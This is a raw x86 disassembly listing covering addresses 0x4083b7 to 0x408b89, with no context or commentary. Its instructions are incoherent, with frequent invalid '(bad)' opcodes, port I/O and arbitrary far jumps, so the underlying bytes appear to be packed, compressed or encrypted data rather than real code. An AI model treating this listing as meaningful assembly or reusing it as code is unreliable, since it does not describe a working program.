  4083b7:	ins    BYTE PTR es:[edi],dx
  4083b8:	test   eax,0x25bc0226
  4083bd:	fwait
  4083be:	enter  0xa529,0xa8
  4083c2:	jns    0x408443
  4083c4:	in     al,0x11
  4083c6:	(bad)  
  4083c7:	xor    eax,0xbf8d8fa
  4083cc:	sub    al,0x63
  4083ce:	xchg   esi,eax
  4083cf:	inc    esp
  4083d0:	in     eax,dx
  4083d1:	out    dx,eax
  4083d2:	or     eax,0xaaab1915
  4083d7:	pushf  
  4083d8:	retf   
  4083d9:	jmp    0xb929:0xec09f2c6
  4083e0:	sub    DWORD PTR [ebx+0x6623fed],eax
  4083e6:	mov    edx,0xde79fa7f
  4083eb:	add    eax,0x2f4b9d69
  4083f0:	and    esp,edx
  4083f2:	pop    edx
  4083f3:	fiadd  DWORD PTR [eax]
  4083f5:	in     eax,0x5b
  4083f7:	add    BYTE PTR [esi],dl
  4083f9:	stos   DWORD PTR es:[edi],eax
  4083fa:	xor    al,0x9b
  4083fc:	repnz (bad) 
  4083fe:	jecxz  0x408463
  408400:	cmp    eax,0x92ff227a
  408405:	lahf   
  408406:	jl     0x40840b
  408408:	call   0xcd5ffe2c
  40840d:	sbb    ebp,DWORD PTR [ecx+0x1]
  408410:	repz xchg ebx,eax
  408412:	retf   
  408413:	mov    cl,0xca
  408415:	cmp    eax,0x3d34c847
  40841a:	retf   0x431a
  40841d:	mov    ?,WORD PTR [edx+edx*2+0x59]
  408421:	mov    ebx,0xcd35a9be
  408426:	ins    DWORD PTR es:[edi],dx
  408427:	aad    0xac
  408429:	push   0xffffffa1
  40842b:	inc    eax
  40842c:	cmp    BYTE PTR [ecx-0x78],0xb9
  408430:	es es dec esp
  408433:	sbb    BYTE PTR [edi],cl
  408435:	and    cl,al
  408437:	fidiv  WORD PTR [eax-0x3e9b5d8c]
  40843d:	push   es
  40843e:	xlat   BYTE PTR ds:[ebx]
  40843f:	enter  0x7954,0xae
  408443:	mov    dh,0x50
  408445:	sbb    BYTE PTR [edx+edx*2-0x3d],ch
  408449:	sti    
  40844a:	fist   DWORD PTR [ecx-0x54]
  40844d:	and    DWORD PTR [edx+edi*4+0x73],edi
  408451:	dec    esi
  408452:	sbb    edx,DWORD PTR [ebx+0xb53d509]
  408458:	fld    DWORD PTR [esp+eax*8]
  40845b:	int3   
  40845c:	mov    BYTE PTR [ebp-0x26],ah
  40845f:	dec    ebp
  408460:	ja     0x4083ed
  408462:	lock clc 
  408464:	and    DWORD PTR [edx],esi
  408466:	jl     0x4084a3
  408468:	call   0x34e88898
  40846d:	std    
  40846e:	inc    esp
  40846f:	(bad)  
  408470:	scas   al,BYTE PTR es:[edi]
  408471:	ins    BYTE PTR es:[edi],dx
  408472:	push   esp
  408473:	sbb    DWORD PTR [ebp-0x12],esp
  408476:	jecxz  0x4084b7
  408478:	mov    esi,0xdb83fddb
  40847d:	sti    
  40847e:	in     eax,dx
  40847f:	mov    eax,ds:0x551f68e3
  408484:	dec    edi
  408485:	es adc edx,DWORD PTR gs:[edx+ecx*2]
  40848a:	imul   eax,DWORD PTR [edi+0xb],0x42
  40848e:	inc    edx
  40848f:	pop    ebx
  408490:	lods   al,BYTE PTR ds:[esi]
  408491:	sub    esp,esi
  408493:	mov    bl,0xf
  408495:	mov    BYTE PTR [edi+0x70],bl
  408498:	test   DWORD PTR cs:[edi+0x79],eax
  40849c:	adc    al,0xfc
  40849e:	jo     0x408443
  4084a0:	or     DWORD PTR [ebp+edi*2+0x6d],ecx
  4084a4:	mov    eax,0xa76aa79e
  4084a9:	(bad)  
  4084aa:	int    0x3b
  4084ac:	jo     0x4084c1
  4084ae:	pop    edi
  4084af:	repz inc ebx
  4084b1:	mov    edx,0x47efa3f9
  4084b6:	popf   
  4084b7:	lods   eax,DWORD PTR ds:[esi]
  4084b8:	sbb    al,0xd4
  4084ba:	or     ebp,DWORD PTR [ebx-0x62]
  4084bd:	or     esi,DWORD PTR [ebp-0x66]
  4084c0:	rol    DWORD PTR [edi+0x44307e45],1
  4084c6:	retf   0x1558
  4084c9:	mov    al,ds:0xc7596acc
  4084ce:	neg    bl
  4084d0:	sbb    esp,DWORD PTR [edi+0x32]
  4084d3:	adc    bl,BYTE PTR [ecx+0x4106db6a]
  4084d9:	fsub   DWORD PTR [esi+0x132dc167]
  4084df:	shr    BYTE PTR [edx],0x17
  4084e2:	and    eax,0xbf535c34
  4084e7:	xchg   BYTE PTR [edx-0xc],ch
  4084ea:	js     0x408471
  4084ec:	jmp    0x526a:0xc9e088a2
  4084f3:	jns    0x4084df
  4084f5:	and    BYTE PTR [edx],ch
  4084f7:	jno    0x4084e8
  4084f9:	jmp    0x601a7736
  4084fe:	cwde   
  4084ff:	dec    ebx
  408500:	mov    ebx,0xa5b108c
  408505:	aaa    
  408506:	aam    0xfa
  408508:	mov    esp,DWORD PTR [edx+0x4d]
  40850b:	nop
  40850c:	aam    0x9a
  40850e:	pop    ds
  40850f:	sub    al,0x2a
  408511:	push   cs
  408512:	mov    ch,0xad
  408514:	arpl   WORD PTR fs:[eax+eiz*2],bp
  408518:	cmp    DWORD PTR [esi],esi
  40851a:	outs   dx,BYTE PTR ds:[esi]
  40851b:	fcmove st,st(4)
  40851d:	ret    0xa868
  408520:	shl    BYTE PTR [ecx-0x70],1
  408523:	or     DWORD PTR [ecx-0x40],ebp
  408526:	sub    dl,BYTE PTR [edi+0x4f]
  408529:	and    eax,ebx
  40852b:	sbb    al,0xc1
  40852d:	inc    ecx
  40852e:	retf   
  40852f:	daa    
  408530:	sub    al,0x16
  408532:	stc    
  408533:	loopne 0x4084d3
  408535:	retf   0x9ced
  408538:	test   eax,0xe2bf00a6
  40853d:	lods   al,BYTE PTR ds:[esi]
  40853e:	lea    edi,ss:[ebx-0x1243ecb4]
  408545:	std    
  408546:	je     0x4085ad
  408548:	loop   0x408545
  40854a:	mov    fs,ebp
  40854c:	adc    ah,BYTE PTR [eax-0x2405e594]
  408552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408553:	push   ecx
  408554:	ret    0xb772
  408557:	and    dl,BYTE PTR ds:0x65ba9384
  40855d:	(bad)  
  40855e:	mov    esi,0x6cf42975
  408563:	fadd   st,st(0)
  408565:	pop    ds
  408566:	rcl    DWORD PTR [ebx-0x77],1
  408569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40856a:	xor    bl,BYTE PTR [ecx-0x4d611cc2]
  408570:	pop    edx
  408571:	sbb    cl,BYTE PTR [edi+0x28bed6e0]
  408577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408578:	call   0xca93349b
  40857d:	pop    esi
  40857e:	out    dx,eax
  40857f:	test   eax,0x9f01c69
  408584:	(bad)  
  408585:	jge    0x40856b
  408587:	mov    al,ds:0x4ad04619
  40858c:	loope  0x40854c
  40858e:	sbb    DWORD PTR ds:[ecx-0x1aefee79],edx
  408595:	pop    esi
  408596:	shr    ch,0x5b
  408599:	or     al,0xc1
  40859b:	test   al,0xec
  40859d:	jmp    0xabb9:0xa65f372c
  4085a4:	loope  0x40861d
  4085a6:	lahf   
  4085a7:	popf   
  4085a8:	daa    
  4085a9:	xor    al,0x97
  4085ab:	rcr    DWORD PTR [edx-0x61],cl
  4085ae:	js     0x408562
  4085b0:	xchg   ecx,eax
  4085b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085b2:	cmp    al,0x1d
  4085b4:	dec    esi
  4085b5:	stos   BYTE PTR es:[edi],al
  4085b6:	jp     0x4085ec
  4085b8:	pop    eax
  4085b9:	push   0xec699a3
  4085be:	fwait
  4085bf:	bound  ebx,QWORD PTR [ecx+0x76796d6e]
  4085c5:	cmp    BYTE PTR [edi],0x8a
  4085c8:	xchg   esi,eax
  4085c9:	push   0x9fe37967
  4085ce:	sub    bl,BYTE PTR [edx+0x613aa710]
  4085d4:	pop    ebp
  4085d5:	cld    
  4085d6:	iret   
  4085d7:	(bad)  
  4085d9:	dec    edi
  4085da:	adc    DWORD PTR [eax-0x47c414ba],eax
  4085e0:	ret    
  4085e1:	mov    eax,0xc3d4aabc
  4085e6:	cs ins DWORD PTR es:[edi],dx
  4085e8:	dec    esi
  4085e9:	adc    ecx,edx
  4085eb:	loope  0x408602
  4085ed:	xlat   BYTE PTR ds:[ebx]
  4085ee:	jmp    0x7cdd6a7f
  4085f3:	jge    0x408645
  4085f5:	fst    st(5)
  4085f7:	add    DWORD PTR [edx],ebx
  4085f9:	daa    
  4085fa:	test   al,0x9a
  4085fc:	push   ds
  4085fd:	rol    BYTE PTR [eax-0x2c147d52],0x1b
  408604:	inc    esp
  408605:	lods   al,BYTE PTR ds:[esi]
  408606:	push   edi
  408607:	inc    edx
  408608:	dec    ecx
  408609:	sar    BYTE PTR [ebx+0x8],0x30
  40860d:	dec    esi
  40860e:	stos   BYTE PTR es:[edi],al
  40860f:	es out dx,eax
  408611:	or     dl,cl
  408613:	cmp    BYTE PTR [eax-0x9c71a86],ch
  408619:	mov    ecx,DWORD PTR [ebx-0x7c]
  40861c:	test   ch,dl
  40861e:	popf   
  40861f:	pop    edx
  408620:	xchg   esi,eax
  408621:	int    0x72
  408623:	pop    ebx
  408624:	sbb    cl,ch
  408626:	ss jle 0x40862e
  408629:	adc    edi,edi
  40862b:	mov    dh,0x7
  40862d:	mov    dh,0xbb
  40862f:	inc    esp
  408630:	mov    bh,0x27
  408632:	push   edi
  408633:	push   ebp
  408634:	dec    ecx
  408635:	xor    BYTE PTR ds:0x3f86365b,dl
  40863b:	ja     0x40867f
  40863d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40863e:	xlat   BYTE PTR ds:[ebx]
  40863f:	ficomp WORD PTR [ecx+0x62]
  408642:	dec    esp
  408643:	mov    al,0x35
  408645:	sar    BYTE PTR [esi-0x17e3dc8c],0xf9
  40864c:	imul   ebp,edx,0x7b
  40864f:	and    eax,0xbc1ec802
  408654:	xor    BYTE PTR [esi+0x39234a90],ah
  40865a:	mov    ecx,DWORD PTR [edx-0x7]
  40865d:	inc    esi
  40865e:	lahf   
  40865f:	mov    ?,esi
  408661:	sbb    ebp,DWORD PTR [eax+0x55]
  408664:	push   0x11415f68
  408669:	mov    ebp,0xe785d00d
  40866e:	pop    eax
  40866f:	outs   dx,DWORD PTR ds:[esi]
  408670:	or     eax,DWORD PTR [eax+0x62]
  408673:	cmp    bh,BYTE PTR [ebp-0x10]
  408676:	inc    eax
  408677:	popa   
  408678:	and    al,0xe5
  40867a:	mov    al,ds:0xf8a93892
  40867f:	inc    ebx
  408680:	pushf  
  408681:	(bad)  
  408682:	fdiv   QWORD PTR [eax+0x39561e18]
  408688:	aam    0xa4
  40868a:	xor    eax,0x1acaf04d
  40868f:	sbb    al,0x96
  408691:	call   0xf1ab161f
  408696:	xchg   edi,eax
  408698:	loopne 0x4086e3
  40869a:	test   BYTE PTR [ecx],dh
  40869c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40869d:	scas   eax,DWORD PTR es:[edi]
  40869e:	mov    ecx,0x9bb302cb
  4086a3:	mov    ebp,0xde14fa6a
  4086a8:	ret    
  4086a9:	pop    ecx
  4086aa:	div    DWORD PTR [eax+ebx*8+0x952945f]
  4086b1:	and    dh,BYTE PTR [eax+0xc0a34d]
  4086b7:	mov    cl,0x32
  4086b9:	nop
  4086ba:	dec    ebp
  4086bb:	pusha  
  4086bc:	add    ebx,ebp
  4086be:	mov    ebp,0xfb73249a
  4086c3:	sub    DWORD PTR [ebx],ecx
  4086c5:	fist   WORD PTR [esi-0x6c45890e]
  4086cb:	jp     0x4086df
  4086cd:	jmp    FWORD PTR [eax-0x3f]
  4086d0:	jb     0x408745
  4086d2:	push   0xc348aaf8
  4086d7:	push   ss
  4086d8:	(bad)  
  4086d9:	push   ss
  4086da:	call   0x71e5:0x3ff361f6
  4086e1:	inc    esp
  4086e2:	dec    ebx
  4086e3:	push   cs
  4086e4:	cli    
  4086e5:	ror    esi,cl
  4086e7:	xor    al,0xab
  4086e9:	mov    bl,0xcf
  4086eb:	jmp    0x3319:0x168ada01
  4086f2:	(bad)  
  4086f3:	cmp    DWORD PTR [edx-0x2d],eax
  4086f6:	mov    bh,0xa5
  4086f8:	pop    ds
  4086f9:	sbb    DWORD PTR [esi-0x32],ecx
  4086fc:	jecxz  0x408750
  4086fe:	repnz fs call 0xa424:0xe32c6ee1
  408707:	mov    ds:0x73963cc9,al
  40870c:	ja     0x40876e
  40870e:	add    edx,ecx
  408710:	and    al,0x1b
  408712:	retf   0x4427
  408715:	in     eax,dx
  408716:	jle    0x40869e
  408718:	call   0x65373de3
  40871d:	xchg   ecx,eax
  40871e:	mov    ah,0xf6
  408720:	cmp    al,0xf8
  408722:	(bad)  
  408723:	jmp    DWORD PTR [eax-0x123c9557]
  408729:	in     al,0x47
  40872b:	push   ds
  40872c:	sbb    BYTE PTR [esi],ch
  40872e:	and    al,0x8
  408730:	das    
  408731:	xchg   esp,eax
  408732:	(bad)  
  408733:	cmp    al,BYTE PTR [esi+0x3abebbe9]
  408739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873a:	cs pusha 
  40873c:	sub    dh,BYTE PTR [edi-0x74]
  40873f:	test   eax,0xe8fbcde5
  408744:	shl    DWORD PTR [esi+eax*8],cl
  408747:	mov    cl,0x64
  408749:	push   eax
  40874a:	shl    BYTE PTR [esp+edx*2+0x1b236d6e],1
  408751:	enter  0x7e91,0xf0
  408755:	pushf  
  408756:	sub    ecx,esp
  408758:	cwde   
  408759:	sbb    BYTE PTR [ebp+0x649b27ef],al
  40875f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408760:	sub    BYTE PTR [ebx-0x3f],ah
  408763:	out    dx,al
  408764:	jo     0x408754
  408766:	push   ds
  408767:	adc    DWORD PTR [edi],edx
  408769:	jg     0x408778
  40876b:	jno    0x4087b9
  40876d:	lods   eax,DWORD PTR ds:[esi]
  40876e:	and    DWORD PTR [edi],edx
  408770:	fisttp QWORD PTR [esi]
  408772:	in     al,0x5c
  408774:	mov    eax,0x7873c71a
  408779:	lods   eax,DWORD PTR ds:[esi]
  40877a:	retf   
  40877b:	add    DWORD PTR [ebp-0x68],edi
  40877e:	and    ecx,DWORD PTR [ecx]
  408780:	mov    al,ds:0x124a6e0e
  408785:	cmp    BYTE PTR ds:0xfa418a44,dl
  40878b:	popa   
  40878c:	push   ss
  40878d:	dec    esp
  40878e:	sub    dh,dl
  408790:	enter  0xe347,0xbc
  408794:	adc    eax,0x2083cc1a
  408799:	pop    esp
  40879a:	inc    ecx
  40879b:	sar    ebx,cl
  40879d:	ds aad 0x51
  4087a0:	rcr    ah,0xc3
  4087a3:	dec    ebp
  4087a4:	inc    edi
  4087a5:	cwde   
  4087a6:	jo     0x40877c
  4087a8:	stc    
  4087a9:	pop    es
  4087aa:	jmp    0x8fb39b9c
  4087af:	xchg   ebp,eax
  4087b0:	mov    ds:0x54f09852,al
  4087b5:	imul   ebx,DWORD PTR [esi-0x29],0xffffffff
  4087b9:	jecxz  0x408747
  4087bb:	jecxz  0x40882a
  4087bd:	scas   eax,DWORD PTR es:[edi]
  4087be:	and    ah,dh
  4087c0:	into   
  4087c1:	idiv   cl
  4087c3:	jg     0x408844
  4087c5:	jl     0xa39c7666
  4087cb:	sub    edx,DWORD PTR [ebx+esi*2-0x1e7b148]
  4087d2:	cmp    edx,ebp
  4087d4:	and    bl,BYTE PTR [ebx]
  4087d6:	add    al,0x24
  4087d8:	ja     0x408786
  4087da:	push   ebx
  4087db:	out    0x61,eax
  4087dd:	fnsave ds:0x2c165e3c
  4087e3:	jo     0x4087d8
  4087e5:	adc    al,BYTE PTR [eax-0x36258294]
  4087eb:	sbb    BYTE PTR [ebx+0x62],dl
  4087ee:	and    al,0x7d
  4087f0:	mov    ecx,DWORD PTR [esi+0x6a]
  4087f3:	test   al,0x4d
  4087f5:	or     bl,bh
  4087f7:	mov    ah,0x76
  4087f9:	fs vpmulhuw xmm5,xmm1,xmm3
  4087fe:	mov    bh,ah
  408800:	sti    
  408801:	std    
  408802:	test   ecx,edx
  408804:	(bad)  
  408805:	ds (bad) 
  408807:	mov    edx,0xbf63b430
  40880c:	outs   dx,DWORD PTR ds:[esi]
  40880d:	inc    edi
  40880e:	fistp  WORD PTR [esi-0x5fcb2796]
  408814:	mov    DWORD PTR [esi-0x6d],eax
  408817:	test   al,0x6b
  408819:	inc    ecx
  40881a:	pop    esp
  40881b:	arpl   di,di
  40881d:	scas   al,BYTE PTR es:[edi]
  40881e:	idiv   BYTE PTR [ebx]
  408820:	out    dx,eax
  408821:	(bad)  
  408822:	mov    edi,0x728317f
  408827:	cmp    al,0xf9
  408829:	hlt    
  40882a:	push   edx
  40882b:	mov    esi,0x89c85582
  408830:	test   al,0x35
  408832:	jge    0x4087d8
  408834:	leave  
  408835:	sbb    eax,DWORD PTR [ebp*2+0x25429809]
  40883c:	xchg   esp,eax
  40883d:	mov    esi,0x9d57f4e9
  408842:	dec    edx
  408843:	fcmovnu st,st(6)
  408845:	pop    ds
  408846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408847:	xor    eax,0x86584e31
  40884c:	mov    eax,ds:0x68159979
  408851:	test   al,0xef
  408853:	rol    BYTE PTR [edi],0x4
  408856:	faddp  st(2),st
  408858:	into   
  408859:	jmp    0x2a4988c2
  40885e:	shr    eax,cl
  408860:	cmp    ecx,DWORD PTR [esi-0x74]
  408863:	pop    es
  408864:	shl    DWORD PTR [ebx+0x7c],1
  408867:	test   al,0x41
  408869:	add    DWORD PTR [edi+0x68],ebx
  40886c:	mov    dl,0x4
  40886e:	pop    ss
  40886f:	mov    eax,0xad8b1609
  408874:	xlat   BYTE PTR ds:[ebx]
  408875:	int    0x54
  408877:	xchg   ecx,eax
  408878:	mov    ch,0xc2
  40887a:	out    dx,eax
  40887b:	jns    0x4088f0
  40887d:	ins    BYTE PTR es:[edi],dx
  40887e:	not    DWORD PTR [ebx]
  408880:	push   ebp
  408881:	xchg   esi,eax
  408882:	imul   esi,DWORD PTR [edi],0xffffffc9
  408885:	sbb    dh,BYTE PTR [ebx]
  408887:	or     DWORD PTR [ebp-0x40fc08f3],ecx
  40888d:	loope  0x4088ad
  40888f:	mov    esp,0xd95a6334
  408894:	test   DWORD PTR [eax],edx
  408896:	adc    edx,esi
  408898:	xor    BYTE PTR [ebx],dh
  40889a:	xchg   ecx,eax
  40889b:	mov    ebp,0x3b90f980
  4088a0:	mov    dh,0x1e
  4088a2:	mov    ch,0xe3
  4088a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088a5:	int    0xbf
  4088a7:	out    dx,al
  4088a8:	cmp    cl,BYTE PTR [esp+edi*4-0xab7ef11]
  4088af:	ins    DWORD PTR es:[edi],dx
  4088b0:	rcr    BYTE PTR [edx+0x6ee2a3c4],0xb1
  4088b7:	dec    eax
  4088b8:	inc    ebp
  4088b9:	inc    eax
  4088ba:	fldpi  
  4088bc:	bound  ebp,QWORD PTR ds:0x7ed2f61b
  4088c2:	ret    0x669e
  4088c5:	fisub  DWORD PTR [ebp+edi*8+0x57f45e86]
  4088cc:	in     eax,0x99
  4088ce:	mov    ecx,0x506a3602
  4088d3:	inc    esp
  4088d4:	and    al,0xad
  4088d6:	xchg   esp,eax
  4088d7:	mov    dl,0xa6
  4088d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088da:	add    al,0x12
  4088dc:	xlat   BYTE PTR ds:[ebx]
  4088dd:	and    eax,0xe20b2eb6
  4088e2:	jmp    0x5e4398
  4088e7:	repz sub ecx,ecx
  4088ea:	retf   
  4088eb:	sub    DWORD PTR [ebp*8+0x67fe6b4d],edi
  4088f2:	in     al,0xdc
  4088f4:	nop
  4088f5:	imul   ecx,ebp,0xffffffad
  4088f8:	(bad)  
  4088f9:	icebp  
  4088fa:	or     cl,bl
  4088fc:	adc    al,0xa9
  4088fe:	test   al,0x68
  408900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408901:	gs leave 
  408903:	pop    edx
  408904:	mov    WORD PTR ds:0x78052285,cs
  40890a:	add    bh,cl
  40890c:	jp     0x408929
  40890e:	daa    
  40890f:	int3   
  408910:	(bad)  
  408911:	jnp    0x408986
  408913:	mov    ecx,DWORD PTR [edx+0x7a3b6ce8]
  408919:	xchg   esp,eax
  40891a:	int    0xf0
  40891c:	mov    ah,0xad
  40891e:	mov    cl,0xfd
  408920:	inc    ebx
  408921:	adc    BYTE PTR [edi],cl
  408923:	int3   
  408924:	add    esp,eax
  408926:	bound  esi,QWORD PTR [eax+0x62349d78]
  40892c:	inc    edx
  40892d:	addr16 repnz pop ebx
  408930:	ror    BYTE PTR [ecx+0x1e2f50f8],1
  408936:	fs push es
  408938:	xor    al,0x77
  40893a:	add    dl,ch
  40893c:	je     0x408962
  40893e:	jo     0x4089ba
  408940:	mov    BYTE PTR [eax-0x10],0x11
  408944:	inc    ebp
  408945:	test   BYTE PTR [ecx+0x20],ah
  408948:	mov    ebx,DWORD PTR [ecx]
  40894a:	xor    bl,dl
  40894c:	in     al,0xf4
  40894e:	setg   ch
  408951:	icebp  
  408952:	fbld   TBYTE PTR [eax+ebp*8]
  408955:	pop    ebx
  408956:	xchg   esi,eax
  408957:	call   0x84d9:0xa667645e
  40895e:	jmp    0x7ef764f6
  408963:	mov    ecx,0xf8f87fc8
  408968:	mov    bh,0x5
  40896a:	fwait
  40896b:	inc    esi
  40896c:	adc    ah,bl
  40896e:	and    bl,BYTE PTR [edx+ebp*8+0x7c]
  408972:	in     al,0x82
  408974:	jmp    0x7d03:0xe44d50c5
  40897b:	ret    
  40897c:	xchg   edx,eax
  40897d:	adc    esi,DWORD PTR [eax-0x1b]
  408980:	out    0x7f,al
  408982:	cmp    eax,0xf586edb2
  408987:	in     eax,dx
  408988:	jb     0x408953
  40898a:	add    dl,BYTE PTR [ecx+edi*2]
  40898d:	fidiv  WORD PTR [edi+0x3f]
  408990:	push   eax
  408991:	ds jnp 0x408965
  408994:	out    dx,eax
  408995:	mov    eax,ds:0x3fcfa4f6
  40899a:	repz add eax,0xa01b3c98
  4089a0:	fisttp WORD PTR [ebx+ecx*1]
  4089a3:	std    
  4089a4:	out    0x46,eax
  4089a6:	ins    DWORD PTR es:[edi],dx
  4089a7:	push   ss
  4089a8:	pop    eax
  4089a9:	loope  0x408945
  4089ab:	in     eax,0xe
  4089ad:	xor    eax,0x30df228b
  4089b2:	xor    al,dh
  4089b4:	popa   
  4089b5:	mov    fs,ebp
  4089b7:	mov    ds:0x66ae6f23,eax
  4089bc:	xchg   esi,eax
  4089bd:	jmp    0x40d8:0x5b628d78
  4089c4:	mov    dh,0x60
  4089c6:	aas    
  4089c7:	xor    al,0x6f
  4089c9:	ss xchg esp,eax
  4089cb:	mov    ebx,0x3042a86
  4089d0:	imul   ebp,DWORD PTR [ecx+0x2f3ec703],0xc990e840
  4089da:	mov    ebx,0xd3b39e04
  4089df:	lds    ecx,FWORD PTR [esi-0x18]
  4089e2:	rcl    BYTE PTR [ecx+0x6d67c62c],cl
  4089e8:	stc    
  4089e9:	sub    al,0x89
  4089eb:	sahf   
  4089ec:	ins    BYTE PTR es:[edi],dx
  4089ed:	lock add ch,BYTE PTR [edi-0x10ba5206]
  4089f4:	mov    BYTE PTR [ebx-0x72],dl
  4089f7:	sub    cl,bh
  4089f9:	lods   eax,DWORD PTR ds:[esi]
  4089fa:	mov    dh,0x28
  4089fc:	mov    es,ecx
  4089fe:	scas   eax,DWORD PTR es:[edi]
  4089ff:	psraw  mm0,0x9e
  408a03:	(bad)  
  408a05:	pop    ss
  408a06:	inc    edx
  408a07:	jle    0x4089dc
  408a09:	mov    cl,0xe9
  408a0b:	jbe    0x408991
  408a0d:	mov    ecx,DWORD PTR [ecx+0x5e]
  408a10:	je     0x408a74
  408a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a13:	bound  edx,QWORD PTR [edi+0x5723d8c2]
  408a19:	retf   
  408a1a:	jmp    0x2875adcc
  408a1f:	and    dl,BYTE PTR [eax-0x5b]
  408a22:	push   cs
  408a23:	sub    DWORD PTR [ecx-0x156085b0],ebp
  408a29:	jne    0x4089f2
  408a2b:	and    dh,BYTE PTR [ebp-0x26]
  408a2e:	outs   dx,BYTE PTR ds:[esi]
  408a2f:	clc    
  408a30:	sahf   
  408a31:	shr    DWORD PTR [eax],0xb0
  408a34:	enter  0xe622,0x51
  408a38:	retf   
  408a39:	mov    DWORD PTR [eax-0x4e],edi
  408a3c:	shr    esi,0x20
  408a3f:	mov    ah,0x93
  408a41:	jno    0x408aa4
  408a43:	jp     0x408a12
  408a45:	mov    esi,0x32cdd84d
  408a4a:	retf   0x4839
  408a4d:	and    al,0x3b
  408a4f:	ror    DWORD PTR [ebx-0x47],0x3a
  408a53:	jmp    DWORD PTR [ebp-0x498d2acb]
  408a59:	(bad)  
  408a5a:	pop    esi
  408a5b:	aam    0x88
  408a5d:	popf   
  408a5e:	adc    al,0x96
  408a60:	sub    eax,0xa57499c1
  408a65:	xor    DWORD PTR [ecx-0x44],ebx
  408a68:	lods   eax,DWORD PTR ds:[esi]
  408a69:	push   es
  408a6a:	jecxz  0x408ad5
  408a6c:	fs jno 0x408a0f
  408a6f:	sbb    cl,BYTE PTR [edx+0x66]
  408a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a73:	retf   
  408a74:	xor    WORD PTR [ebx+0x33],ax
  408a78:	fiadd  WORD PTR [edx+0x335f776e]
  408a7e:	das    
  408a7f:	sub    al,0xd1
  408a81:	jmp    0x50b:0xb1db4781
  408a88:	imul   edx,DWORD PTR [ebx+0x69],0x83c5a493
  408a8f:	mov    cl,0xee
  408a91:	pop    eax
  408a92:	pop    esi
  408a93:	mov    ds:0xf42d285d,al
  408a98:	(bad)  
  408a99:	scas   al,BYTE PTR es:[edi]
  408a9a:	sar    eax,1
  408a9c:	ror    edi,1
  408a9e:	bnd ret 0xc8d6
  408aa2:	mov    esi,0x8f63421b
  408aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aa8:	xchg   edi,eax
  408aa9:	pop    ds
  408aaa:	inc    ebp
  408aab:	dec    esi
  408aac:	mov    dh,cl
  408aae:	daa    
  408aaf:	jb     0x408a35
  408ab1:	lea    edx,[edi+esi*4]
  408ab4:	int    0x38
  408ab6:	punpcklbw mm2,mm3
  408ab9:	clc    
  408aba:	mov    eax,0xaa2ec4db
  408abf:	or     eax,0x8bd1d413
  408ac4:	ss mov edx,0x1331586a
  408aca:	scas   eax,DWORD PTR es:[edi]
  408acb:	aam    0x11
  408acd:	fcomip st,st(6)
  408acf:	sub    ecx,edi
  408ad1:	aas    
  408ad2:	in     eax,0x47
  408ad4:	or     bh,ah
  408ad6:	or     cl,cl
  408ad8:	pop    esp
  408ad9:	enter  0xee7d,0xcc
  408add:	sub    BYTE PTR [ebx-0xd8d4da8],dh
  408ae3:	mov    esp,0xb804184b
  408ae8:	jo     0x408a78
  408aea:	repz pop esp
  408aec:	and    bh,BYTE PTR [ebp+0x3f]
  408aef:	in     al,dx
  408af0:	(bad)  
  408af1:	push   ss
  408af2:	and    al,0x4c
  408af4:	mov    dl,0x79
  408af6:	xchg   esp,eax
  408af7:	repz xor edi,DWORD PTR [edx-0x5fb4bfa]
  408afe:	sbb    DWORD PTR [edi+eax*1-0x6ecffb5a],ebx
  408b05:	cmp    al,0xc
  408b07:	jo     0x408afe
  408b09:	repnz push 0xffffff8b
  408b0c:	rol    BYTE PTR [esi],1
  408b0e:	lods   al,BYTE PTR ds:[esi]
  408b0f:	jnp    0x408abf
  408b11:	mov    dh,0xcf
  408b13:	outs   dx,BYTE PTR ds:[esi]
  408b14:	shl    BYTE PTR ds:0x9321c534,1
  408b1a:	out    0x6e,eax
  408b1c:	xor    dh,dh
  408b1e:	(bad)  
  408b1f:	sbb    eax,0x33685053
  408b24:	jae    0x408b2e
  408b26:	add    al,0x31
  408b28:	div    BYTE PTR [ebx+0x231b346e]
  408b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b2f:	(bad)  
  408b30:	std    
  408b31:	push   ss
  408b32:	fld    TBYTE PTR [ecx-0x7b81c6d5]
  408b38:	int3   
  408b39:	or     BYTE PTR ds:0xcffce7a7,ah
  408b3f:	add    edx,0xffffff86
  408b42:	jo     0x408bbe
  408b44:	xor    DWORD PTR [edi-0x31],edi
  408b47:	daa    
  408b48:	or     ebx,DWORD PTR [edx-0xd3f90c5]
  408b4e:	pop    eax
  408b4f:	pop    ebp
  408b50:	push   es
  408b51:	and    esp,DWORD PTR [edi]
  408b53:	pop    es
  408b54:	pop    ss
  408b55:	lock xchg edi,eax
  408b57:	dec    ecx
  408b58:	int3   
  408b59:	cmp    ebx,eax
  408b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b5c:	jp     0x408b6e
  408b5e:	outs   dx,BYTE PTR ds:[esi]
  408b5f:	dec    esi
  408b60:	fwait
  408b61:	aad    0xef
  408b63:	jne    0x408b59
  408b65:	push   esi
  408b66:	lock rcl DWORD PTR [ecx-0x32],1
  408b6a:	dec    edi
  408b6b:	stos   DWORD PTR es:[edi],eax
  408b6c:	mov    dh,0xbc
  408b6e:	jb     0x408bd4
  408b70:	push   eax
  408b71:	add    DWORD PTR [ebx-0x40],ebp
  408b74:	ret    
  408b75:	or     eax,0xa4a49e25
  408b7a:	push   ax
  408b7c:	nop    ebp
  408b7f:	push   ss
  408b80:	xor    edx,DWORD PTR [bx+di-0x5760]
  408b85:	mov    DWORD PTR [ebx+0x23],ebp
  408b88:	inc    esi
  408b89:	mov    ch,0x64
